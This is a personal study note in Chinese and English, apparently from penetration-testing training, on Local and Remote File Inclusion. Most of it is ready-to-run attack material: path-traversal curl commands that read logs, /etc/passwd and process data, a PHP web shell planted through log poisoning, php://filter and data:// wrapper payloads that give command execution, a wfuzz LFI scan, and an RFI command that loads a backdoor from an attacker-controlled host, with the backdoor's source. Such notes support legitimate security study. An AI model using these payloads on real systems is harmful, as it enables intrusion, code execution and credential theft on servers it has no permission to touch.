>[!info]
>* Learn the difference between File Inclusion and Directory Traversal vulnerabilities
>* Gain an understanding of File Inclusion vulnerabilities
>* Understand how to leverage Local File Inclusion (LFI) to obtain code Execution
>* Explore PHP wrapper usage
>* Learn how to perform Remote File Inclusion (RFI) attacks
## Local File Inclusion (LFI)
>[!warning] 重點
>如果可以控制以下內容，就可以做到Local File Include 
> * File upload
> * Sql Injection (into out file)
> * File posion (大部分的.log都沒有權限)
> * File posion (/proc/self/environ – user自己的環境變數 )
 > * session file

> [!解釋]
>LFI跟Path traversal的差別就是LFI可以讓撈到的檔案執行，如果不是執行檔那就可以讀到source code，而Path traversal就是單純讀檔案而已。
>常見的LFI rce手法有 Log Poisoning

### LFI的執行步驟
1. 確認可以存取logs
```
curl http://192.168.0.100/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
2. 利用各種手法注入code
```
<?php echo system($_GET['cmd']); ?>
```
3. 啟動RCE
```
curl http://192.168.0.100/index.php?page=../../../../../../../../../var/log/apache2/access.log?cmd=id
```
#### 常見的logs位置

| 名稱     | 位置                            |
| ------ | ----------------------------- |
| Nginx  | `/var/log/nginx/`             |
| Nginx  | ` C:\nginx\log\ `             |
| apache | `/var/log/apache2/access.log` |
```
- C:/Windows/Panther/Unattend/Unattended.xml
- C:/Windows/Panther/Unattended.xml
- C:/Windows/Panther/Unattend.txt
- C:/Unattend.xml
- C:/Autounattend.xml
- C:/Windows/system32/sysprep
```
- 用url抓取當前執行的process
``` title:pg_Bottleup
curl http://192.168.154.246:8080/view?page=/..%%32%66..%%32%66/proc/self/cmdline  --output - 
```
* 用curl繞過
```
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
#### 利用`wfuzz`找LFI
- [LFI-Interesting-Files（249）.txt](https://github.com/ricew4ng/Blasting-Dictionary/blob/master/LFI-Interesting-Files%EF%BC%88249%EF%BC%89.txt)

```
wfuzz -c --hh=32 -z file,LFI\ payloads.txt http://192.168.160.246:8080/view?page=FUZZ
```
### PHP Wrapper & PHP filter
>[!warning]  小節目錄
 一種PHP的神奇功能，在有LFI漏洞前提下，可以拿到source code或是RCE

* PHP filter 
```
curl http://192.168.1.100/index.php?page=php://filter/resource=admin.php
```
* PHP filter with base64 encode 
```
curl http://192.168.1.100/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
* data://
>可以注入資料的wrapper
his wrapper is used to embed data elements as plaintext or base64-encoded data in the running web application's code. This offers an alternative method when we cannot poison a local file with PHP code.
```
curl "http://192.168.1.100/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
* data wrapper with base64
```
curl "http://192.168.1.100/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
### Log Poisoning
>[!warning] 重點
>Log Poisoning works by modifying data we send to a web application so that the logs contain executable code. In an LFI vulnerability scenario, the local file we include is executed if it contains executable content. This means that if we manage to write executable code to a file and include it within the running code, it will be executed.
* 確認可以存取access.log
``` =
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
* 利用burpsuit修改封包內容，同時將php code 注入access.log
``` =
<?php echo system($_GET['cmd']); ?>
```
![[Pasted image 20250504090416.png]]
* 起動RCE
``` =
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log?cmd=id
```
![[Pasted image 20250504090435.png]]
### 讀取檔案後的思路
>[!warning]
>pg pratice Maria
- We found a user Jospeh from /etc/passwd, we can try to check if we could read his SSH key ? So we can SSH to the machine.
- Checking the FTP folder where we found it earlier, we might be able to get mysql credentials since the file is related to mysql (base on the folder name).
- Looking for other wordpress config file containing admin/DB credentials so we can login to the portal/DB.
```
python3 cve_2020-11738.py http://192.168.195.167 /etc/vsftpd.conf
```
## Remote File Inclusion (RFI)
>[!info]
>如果有開allow_url_include的話，可以讓php讀取外部的檔案，並且load到頁面裡面。

``` =
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```
``` php=
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```






























































